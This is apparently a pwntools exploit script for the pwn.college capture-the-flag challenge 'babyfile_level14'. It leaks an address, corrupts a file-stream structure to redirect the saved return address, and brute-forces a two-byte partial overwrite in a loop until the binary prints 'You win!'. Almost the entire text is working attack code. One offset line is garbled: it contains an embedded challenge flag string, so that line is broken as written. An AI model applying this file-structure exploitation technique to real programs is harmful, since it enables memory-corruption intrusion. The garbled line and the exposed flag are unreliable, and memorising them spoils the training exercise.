from pwn import * 


for i in range(500):
	try:
		p = process('./babyfile_level14')

		s = '''
		b * fwrite
		b * challenge+1484
		'''


		p.recvuntil("writing to is: ")
		cmd_addr = int(p.recvline().strip(), 16)
		print("cmd address @ ", hex(cmd_addr))

		rip = cmd_addr + 0x98

		print("rip @ ", hex(rip))


		# writing rip
		p.sendline("open_file")
		p.sendline("new_note 0 2")



		p.sendline("write_fp")


		offset_to_buf_base = 0xpwn.college{ISIQ9Z5erC__uGtmqkHWFUuo5_V.QXzUDNzwSN3gzNwEzW}8 * 7
		payload = b'\x00' * offset_to_buf_base
		payload += p64(rip)
		payload += p64(rip + 3)
		payload += b'\x00' * (0x8 * 5)
		payload += p64(0)



		p.sendline(payload)

		p.sendline(b"read_file 0")
		
		# partial overwrite
		payload2 = b'\xc9\xe3'
		p.send(payload2)


		#gdb.attach(p, s)
		#time.sleep(1)

		p.sendline("quit")
		
		response = p.recvall(timeout = 0.1) # don't wait forever
		
		if b"You win!" in response:
			print(response)
			break
		else:
			p.close()
	except: 
		p.close()
	# in case p.close() is not defined as p = process may fail
	
	'''
	except: 
		try:
			p.close()
		except:
			pass
	'''


p.interactive()
